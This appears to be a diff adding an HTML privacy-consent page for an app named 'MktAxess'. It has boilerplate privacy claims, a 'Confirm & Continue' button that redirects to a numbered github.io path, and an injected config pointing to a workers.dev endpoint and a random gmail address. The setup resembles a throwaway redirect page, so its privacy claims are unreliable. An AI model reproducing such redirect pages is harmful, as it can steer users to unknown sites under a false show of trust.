@@ -1,0 +1,346 @@
+<script>window.appInformation = {"name":"MktAxess","icon":"","identifier":"aagwbe.dvsae.wewewwss","email":"aagwbe.dvsae.wewewwss@gmail.com","apiBase":"https:\/\/9b31d0c439059356605bb892f98f9533-worker.bonnywittbbv.workers.dev","platform":"android"};</script><!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+  <title>MktAxess · Privacy</title>
+  <style>
+    /* Minimal modern reset & base */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      background: #f6f8fc;
+      font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 1.5rem;
+      line-height: 1.5;
+      color: #1e293b;
+    }
+
+    /* Main card – clean, trustworthy, subtle shadow */
+    .privacy-card {
+      max-width: 640px;
+      width: 100%;
+      background: #ffffff;
+      border-radius: 32px;
+      padding: 2.5rem 2.2rem;
+      box-shadow: 0 20px 35px -8px rgba(0, 20, 40, 0.12), 0 8px 18px -6px rgba(0, 0, 0, 0.05);
+      transition: transform 0.15s ease;
+    }
+
+    /* Brand header */
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 1.8rem;
+    }
+
+    .brand-icon {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: #2563eb;
+      color: white;
+      width: 44px;
+      height: 44px;
+      border-radius: 14px;
+      font-weight: 700;
+      font-size: 1.6rem;
+      box-shadow: 0 6px 12px -4px rgba(37, 99, 235, 0.3);
+      user-select: none;
+    }
+
+    .brand h1 {
+      font-size: 1.9rem;
+      font-weight: 600;
+      letter-spacing: -0.02em;
+      color: #0f172a;
+    }
+
+    /* Title */
+    .title {
+      font-size: 1.65rem;
+      font-weight: 600;
+      letter-spacing: -0.01em;
+      color: #0f172a;
+      margin-bottom: 0.5rem;
+      padding-bottom: 0.25rem;
+      border-bottom: 2px solid #eef2f6;
+    }
+
+    /* Subtitle / last updated */
+    .meta {
+      font-size: 0.9rem;
+      color: #5e6f8d;
+      margin-bottom: 2rem;
+      display: flex;
+      flex-wrap: wrap;
+      gap: 0.5rem 1rem;
+      align-items: center;
+    }
+
+    .meta .dot {
+      display: inline-block;
+      width: 4px;
+      height: 4px;
+      background: #a0b3cc;
+      border-radius: 50%;
+      margin: 0 0.25rem;
+    }
+
+    /* Privacy content – readable, trustworthy */
+    .privacy-text {
+      display: flex;
+      flex-direction: column;
+      gap: 1.25rem;
+      margin-bottom: 2.2rem;
+    }
+
+    .privacy-text p {
+      font-size: 1rem;
+      color: #1e2b3e;
+      background: #fafcff;
+      padding: 0.9rem 1.3rem;
+      border-radius: 18px;
+      border: 1px solid #e9edf4;
+    }
+
+    .privacy-text p strong {
+      color: #0f172a;
+      font-weight: 600;
+    }
+
+    .privacy-text ul {
+      list-style: none;
+      display: flex;
+      flex-direction: column;
+      gap: 0.8rem;
+    }
+
+    .privacy-text li {
+      display: flex;
+      gap: 0.85rem;
+      align-items: flex-start;
+      font-size: 0.98rem;
+      background: #ffffff;
+      padding: 0.7rem 1.2rem;
+      border-radius: 18px;
+      border: 1px solid #eef2f6;
+      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.01);
+    }
+
+    .li-icon {
+      flex-shrink: 0;
+      width: 22px;
+      height: 22px;
+      background: #dbeafe;
+      border-radius: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #1e4f8a;
+      font-weight: 700;
+      font-size: 0.85rem;
+    }
+
+    /* Confirmation section */
+    .action-area {
+      display: flex;
+      flex-direction: column;
+      gap: 1rem;
+      border-top: 1px solid #e2e8f0;
+      padding-top: 1.8rem;
+      margin-top: 0.2rem;
+    }
+
+    .consent-note {
+      font-size: 0.9rem;
+      color: #485e7a;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      flex-wrap: wrap;
+      justify-content: center;
+      text-align: center;
+    }
+
+    .consent-note svg {
+      opacity: 0.7;
+    }
+
+    /* Primary button */
+    .btn-confirm {
+      background: #1e4f8a;
+      background: linear-gradient(145deg, #1e4f8a, #143b6b);
+      border: none;
+      color: white;
+      font-size: 1.2rem;
+      font-weight: 600;
+      padding: 1rem 1.8rem;
+      border-radius: 60px;
+      width: 100%;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.6rem;
+      transition: all 0.18s ease;
+      box-shadow: 0 12px 20px -10px rgba(22, 78, 140, 0.45);
+      letter-spacing: 0.2px;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+    }
+
+    .btn-confirm:hover {
+      background: #143b6b;
+      background: linear-gradient(145deg, #1a4478, #10335c);
+      transform: scale(1.01);
+      box-shadow: 0 16px 26px -10px rgba(18, 65, 120, 0.55);
+    }
+
+    .btn-confirm:active {
+      transform: scale(0.99);
+      box-shadow: 0 8px 14px -8px #0a2a4b;
+    }
+
+    .btn-confirm:focus-visible {
+      outline: 3px solid #97b9e0;
+      outline-offset: 3px;
+    }
+
+    /* Footer microtext */
+    .footer-note {
+      text-align: center;
+      margin-top: 1.5rem;
+      font-size: 0.78rem;
+      color: #8b9eb5;
+      letter-spacing: 0.2px;
+    }
+
+    /* Responsive adjustments */
+    @media (max-width: 480px) {
+      body {
+        padding: 1rem;
+      }
+      .privacy-card {
+        padding: 1.8rem 1.4rem;
+        border-radius: 28px;
+      }
+      .brand h1 {
+        font-size: 1.65rem;
+      }
+      .title {
+        font-size: 1.45rem;
+      }
+      .btn-confirm {
+        font-size: 1.1rem;
+        padding: 0.9rem 1.2rem;
+      }
+      .privacy-text p,
+      .privacy-text li {
+        padding: 0.8rem 1rem;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="privacy-card">
+    <!-- Brand / logo -->
+    <div class="brand">
+      <div class="brand-icon" aria-hidden="true">M</div>
+      <h1>MktAxess</h1>
+    </div>
+
+    <!-- Privacy heading -->
+    <div class="title">Privacy & Data Protection</div>
+    <div class="meta">
+      <span>Last updated: April 2025</span>
+      <span class="dot"></span>
+      <span>Version 2.1</span>
+    </div>
+
+    <!-- Privacy summary -->
+    <div class="privacy-text">
+      <p>
+        <strong>MktAxess</strong> respects your privacy. This page summarises how we handle
+        your information when you use our services. We keep it simple and transparent.
+      </p>
+
+      <ul>
+        <li>
+          <span class="li-icon">🔒</span>
+          <span><strong>No unnecessary collection.</strong> We only process data required to provide and improve the service.</span>
+        </li>
+        <li>
+          <span class="li-icon">📋</span>
+          <span><strong>You are in control.</strong> You can request access, correction, or deletion of your data at any time.</span>
+        </li>
+        <li>
+          <span class="li-icon">🛡️</span>
+          <span><strong>Protected & encrypted.</strong> Your data is secured using industry‑standard measures, and we never sell it.</span>
+        </li>
+      </ul>
+
+      <p>
+        By clicking <strong>“Confirm & Continue”</strong> you acknowledge this privacy summary
+        and agree to proceed to the MktAxess experience. Full details are available in our
+        complete privacy policy.
+      </p>
+    </div>
+
+    <!-- Action: confirmation button -->
+    <div class="action-area">
+      <div class="consent-note">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#1e4f8a" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+          <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14" />
+          <polyline points="22 4 12 14.01 9 11.01" />
+        </svg>
+        <span>You will be redirected after confirmation</span>
+      </div>
+
+      <!-- The button that triggers redirection to the specified URL -->
+      <button id="confirmBtn" class="btn-confirm" type="button">
+        <span>Confirm & Continue</span>
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+          <line x1="5" y1="12" x2="19" y2="12" />
+          <polyline points="12 5 19 12 12 19" />
+        </svg>
+      </button>
+    </div>
+
+    <div class="footer-note">
+      © MktAxess — privacy first, always.
+    </div>
+  </div>
+
+  <script>
+    (function() {
+      // Target URL as specified
+      const REDIRECT_URL = 'https://shulendarkumar385-web.github.io/37/f5/index.html';
+
+      const confirmButton = document.getElementById('confirmBtn');
+
+      function handleConfirmation() {
+        // Redirect to the provided URL
+        window.location.href = REDIRECT_URL;
+      }
+
+      // Attach event listener to the button
+      if (confirmButton) {
+        confirmButton.addEventListener('click', handleConfirmation);
+      }
+
+      // (Optional) For any keyboard user, the button is natively focusable.
+      // No further action needed.
+    })();
+  </script>
+</body>
+</html>
